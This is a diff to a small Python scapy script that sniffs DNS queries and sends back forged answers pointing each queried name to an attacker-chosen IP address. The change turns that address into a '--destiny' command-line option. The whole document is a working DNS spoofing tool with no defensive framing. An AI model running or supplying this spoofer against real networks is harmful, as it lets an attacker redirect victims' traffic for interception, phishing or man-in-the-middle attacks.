@@ -1,4 +1,8 @@
+import argparse
+
 from scapy.all import DNS, IP, UDP, DNSRR, send, sniff
+
+destiny = None
 
 
 def on_dns_packet_detected(pkt):
@@ -14,10 +18,16 @@ def on_dns_packet_detected(pkt):
     response[DNS].id = pkt[DNS].id
     response[DNS].qr = 1
     response[DNS].qd = pkt[DNS].qd
-    response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.1")
+    response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=destiny)
 
     send(response)
 
 
 if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--destiny', type=str, default='127.0.0.1', help='Default destiny for DNS packets')
+    args = parser.parse_args()
+
+    destiny = args.destiny
+
     sniff(prn=on_dns_packet_detected)
